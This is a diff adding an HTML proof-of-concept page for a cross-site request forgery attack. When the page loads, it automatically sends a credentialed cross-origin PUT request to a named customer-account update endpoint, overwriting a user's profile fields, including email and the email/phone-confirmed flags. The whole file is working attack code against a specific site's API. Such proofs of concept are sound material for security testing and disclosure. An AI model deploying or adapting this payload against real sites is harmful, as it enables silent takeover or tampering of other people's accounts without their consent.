@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF PoC - Fetch API</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept (Fetch API)</h1>
+    <p>Attempting cross-origin request...</p>
+
+    <script>
+        async function sendCsrf() {
+            const formData = new FormData();
+            formData.append("Id", "8281be17-cf84-4817-b32e-df0674e81fe0");
+            formData.append("UserName", "hejiwe4706@rpaintel.com");
+            formData.append("FirstName", "Ram");
+            formData.append("LastName", "Ram");
+            formData.append("MobileNo", "9898989898");
+            formData.append("Gender", "Male");
+            formData.append("IsEmailConfirmed", "true");
+            formData.append("IsPhoneConfirmed", "true");
+            formData.append("ProfileImage", "");
+            formData.append("FileName", "");
+            formData.append("OldProfileImage", "");
+
+            try {
+                // Attempts cross-origin PUT request with credentials (cookies)
+                const response = await fetch("https://api.suryaelectronics.in/api/Account/Customer/Update", {
+                    method: "PUT",
+                    mode: "cors",
+                    credentials: "include", // Sends cookies if the endpoint relies on session cookies
+                    body: formData
+                });
+                
+                const result = await response.json();
+                console.log("Success:", result);
+            } catch (error) {
+                console.error("Request blocked or failed:", error);
+            }
+        }
+
+        // Execute automatically when page opens
+        window.onload = sendCsrf;
+    </script>
+</body>
+</html>
